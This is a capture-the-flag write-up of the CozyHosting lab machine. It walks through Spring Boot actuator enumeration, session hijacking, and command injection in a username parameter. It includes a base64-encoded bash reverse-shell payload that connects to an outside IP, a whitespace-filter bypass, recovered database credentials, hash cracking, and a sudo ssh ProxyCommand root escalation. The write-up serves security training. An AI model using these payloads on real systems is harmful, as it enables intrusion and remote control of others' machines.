# CozyHosting

## Enumeration:

Start off with an NMAP scan:

```vim
┌──(kali㉿kali)-[~/cozyhosting]
└─$ nmap -A -Pn -v -p- --min-rate=10000 10.10.11.230
Nmap scan report for 10.10.11.230
Host is up (0.26s latency).
Not shown: 42384 closed tcp ports (conn-refused), 23149 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This leaks the `cozyhosting.htb` domain which we can add to `/etc/hosts`

Running a subdirectory fuzz, we can find the following endpoints:
1. `/login`
2. `/logout`
3. `/index`
4. `/admin`
5. `/error`

The error message was something unique that I had not come across before:
```
# Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.

Mon Sep 04 09:44:57 UTC 2023

There was an unexpected error (type=Not Found, status=404).
```

Googling the error message implies that this is a Spring Framework website. Due to the various special endpoints that SpringFramework has, I decided to use the `spring-boot.txt` wordlist from SecLists and found the following endpoints:
1. `/actuator`
2. `/actuator/env`
3. `/actuator/env/home`
4. `/actuator/env/lang`
5. `/actuator/env/path`
6. `/actuator/health`
7. `/actuator/mappings`
8. `/actuator/sessions`
9. `/actuator/beans`

While all the above endpoints reveal some information about the SpringFramework WebApp, the `/actuator/sessions` endpoint reveals Session IDs for users. Specifically, it reveals the Session ID for the `kanderson` user.

After updating our cookie, we can access the `/admin` endpoint which allows us to "Include host into automatic patching". All this does is send a POST request to the `/executessh` endpoint with 2 parameters, host and username.

## Exploit:

Submitting the following parameters `host=localhost&username=` will result in a response with the following error:
```http
HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 04 Sep 2023 09:58:07 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]           [-i identity_file] [-J [user@]host[:port]] [-L address]           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]           [-w local_tun[:remote_tun]] destination [command [argument ...]]
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
```

This shows that the `username` parameter is vulnerable to command injection. We can perform RCE with the following payload: 
```bash
host=localhost&username=$(whoami|$0)#
```

This payload performs RCE and redirects the output to file descriptor 0 (without the pipe, it would only show 1 line of output). We can see that user we have access to is called `app`. However, if we use a space in the payload, we get the following error: `Username can't contain whitespaces!`.

To bypass this, We can use `${IFS}` variable to replicate a space allowing us to execute commands like this: 
```bash
host=localhost&username=$(cat${IFS}/etc/passwd|$0)#
```

The output is not too clean and still misses some information, but we can still use a reverse shell payload like this:
```bash
host=localhost&username=$(echo${IFS}YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC41OC85MDAwIDA%2bJjEK${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash)#
```

The above payload just has the normal bash reverse shell encoded in base64, which is then decoded and piped to bash.
## Privilege Escalation:

### app to josh (Lateral Movement):

When we get on the machine, we can see the `cloudhosting-0.0.1.jar` file and we can see that it has another user called josh in the `/home` directory. We can extract it with `jar xf cloudhosting-0.0.1.jar`.

Looking into the files extracted, we can find the database creds (Specifically PostgresSQL) in `Boot-INF/classes/application.properties`

```bash
┌──(kali㉿kali)-[~/cozyhosting/BOOT-INF/classes]
└─$ cat application.properties 
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Run the following:
```bash
app@cozyhosting:/app$ psql -h localhost -U postgres

postgres=# \c cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
cozyhosting=# \d
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)

cozyhosting=# select * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

We can see the admin hash, using hashcat to crack it, we get the following credentials for josh: `josh:$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited`

We can simply SSH into josh with his password.

User Flag is in: `/home/josh/user.txt`
### josh to root:

Using `sudo -l` we see the following:
```bash
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Sorry, try again.
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

On [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/#sudo), we can see that the `ssh` command can be exploited with the payload below:
```bash
josh@cozyhosting:~$ sudo /usr/bin/ssh -o ProxyCommand=';bash 0<&2 1>&2' x
```

Root Flag is in: `/root/root.txt`
